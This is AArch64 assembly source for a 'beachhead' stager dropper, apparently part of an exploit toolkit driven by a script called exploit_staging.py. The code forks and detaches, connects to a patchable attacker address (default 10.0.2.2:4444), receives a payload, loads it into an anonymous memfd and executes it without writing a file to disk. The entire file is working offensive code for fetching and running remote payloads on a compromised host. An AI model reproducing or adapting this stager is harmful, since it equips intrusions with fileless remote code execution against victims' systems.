/* beachhead_stager.S — AArch64 stager dropper */

/* Syscalls (AArch64):
 *   clone   = 220
 *   setsid  = 157
 *   socket  = 198
 *   connect = 203
 *   dup3    = 24
 *   execve  = 221
 *   exit    = 93
 */

.text
.global _start
_start:

    /* fork: clone(SIGCHILD, 0) */
    mov x8, #220 // clone syscall
    mov x0, #17 // when child dies send SIGCHILD to parent
    mov x1, #0
    mov x2, #0
    mov x3, #0
    mov x4, #0
    svc #0 
    cbnz x0, _parent

    /* child: setsid() */
    mov x8, #157
    svc #0

    sub sp, sp, #128

    /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
    mov x8, #198
    mov x0, #2
    mov x1, #1
    mov x2, #0
    svc #0
    mov x19, x0

    /* build sockaddr_in at sp+0 */
    adr x5, _sockaddr
    ldr w0, [x5]
    str w0, [sp]
    ldr w0, [x5, #4]
    str w0, [sp, #4]
    str xzr, [sp, #8]

    /* connect(sockfd, sp, 16) */
    mov x8, #203
    mov x0, x19
    mov x1, sp
    mov x2, #16
    svc #0
    tbnz x0, #63, _fail

    /* recv header [magic:4][size:4] = 8 bytes into sp+16 */
    add x20, sp, #16
    mov x23, #0
_hdr_loop:
    cmp x23, #8
    b.ge _hdr_done
    mov x8, #207
    mov x0, x19
    add x1, x20, x23
    mov x2, #8
    sub x2, x2, x23
    mov x3, #0
    mov x4, #0
    mov x5, #0
    svc #0
    cbz x0, _fail
    tbnz x0, #63, _fail
    add x23, x23, x0
    b _hdr_loop
_hdr_done:

    /* validate magic == 0xDEADB17D ("DEAD BIRD") */
    ldr w0, [x20]
    mov w1, #0xB17D
    movk w1, #0xDEAD, lsl #16
    cmp w0, w1
    b.ne _fail

    /* x21 = payload size */
    ldr w21, [x20, #4]
    uxtw x21, w21

    /* mmap(0, size, PROT_READ|PROT_WRITE=3, MAP_PRIVATE|MAP_ANONYMOUS=0x22, -1, 0) */
    mov x8, #222
    mov x0, #0
    mov x1, x21
    mov x2, #3
    mov x3, #0x22
    mov x4, #-1
    mov x5, #0
    svc #0
    mov x22, x0

    /* recv_exact: receive x21 bytes into x22 */
    mov x23, #0
_recv_loop:
    cmp x23, x21
    b.ge _recv_done
    mov x8, #207
    mov x0, x19
    add x1, x22, x23
    sub x2, x21, x23
    mov x3, #0
    mov x4, #0
    mov x5, #0
    svc #0
    cbz x0, _fail
    tbnz x0, #63, _fail
    add x23, x23, x0
    b _recv_loop
_recv_done:

    /* close socket — stager makes its own connection */
    mov x8, #57
    mov x0, x19
    svc #0

    /* memfd_create("s", MFD_CLOEXEC=1 | MFD_EXEC=0x10)
     * MFD_EXEC required on Linux 6.3+ — without it execve returns EACCES. */
    adr x0, _mfd_name
    mov x1, #0x11
    mov x8, #279
    svc #0
    mov x24, x0

    /* write_exact: write x21 bytes from x22 to x24 */
    mov x23, #0
_write_loop:
    cmp x23, x21
    b.ge _write_done
    mov x8, #64
    mov x0, x24
    add x1, x22, x23
    sub x2, x21, x23
    svc #0
    cbz x0, _fail
    tbnz x0, #63, _fail
    add x23, x23, x0
    b _write_loop
_write_done:

    /* execve("/proc/self/fd/<mfd>", ["stager",NULL], NULL)
     * More robust than execveat(AT_EMPTY_PATH) under QEMU — follows the
     * fd symlink directly rather than relying on kernel AT_EMPTY_PATH support. */

    /* convert x24 (fd number) to decimal string at sp+48
     * fd is small (3-9), so single digit is the common case */
    mov x0, x24
    mov x1, #10
    udiv x2, x0, x1       /* x2 = fd / 10 */
    msub x3, x2, x1, x0   /* x3 = fd % 10 (ones digit) */
    add x3, x3, #0x30      /* ASCII digit */

    /* build "/proc/self/fd/N\0" at sp+48 */
    adr x5, _proc_prefix   /* "/proc/self/fd/" */
    add x6, sp, #48
    mov x7, #0
_copy_prefix:
    ldrb w0, [x5, x7]
    strb w0, [x6, x7]
    cbz w0, _prefix_done
    add x7, x7, #1
    b _copy_prefix
_prefix_done:
    /* x7 already points at the stored null — write digits starting here */
    cbz x2, _single_digit  /* no tens digit */
    add x0, x2, #0x30
    strb w0, [x6, x7]
    add x7, x7, #1
_single_digit:
    strb w3, [x6, x7]
    add x7, x7, #1
    strb wzr, [x6, x7]    /* null terminate */

    /* argv = [path, NULL] at sp+80 */
    add x0, sp, #48
    str x0, [sp, #80]
    str xzr, [sp, #88]

    mov x8, #221           /* execve */
    add x0, sp, #48        /* path = "/proc/self/fd/N" */
    add x1, sp, #80        /* argv */
    mov x2, #0             /* envp = NULL */
    svc #0

_fail:
    mov x8, #93
    mov x0, #1
    svc #0

_parent:
    ret

_mfd_name:    .asciz "s"
_proc_prefix: .asciz "/proc/self/fd/"
.align 2

/*
 * Patchable sockaddr_in — exploit_staging.py replaces at runtime.
 * Layout: [AF_INET 2B][port network-order 2B][IP network-order 4B]
 * Default: 10.0.2.2:4444
 */
_sockaddr:
    .byte 0x02, 0x00
    .byte 0x11, 0x5c
    .byte 0x0a, 0x00, 0x02, 0x02
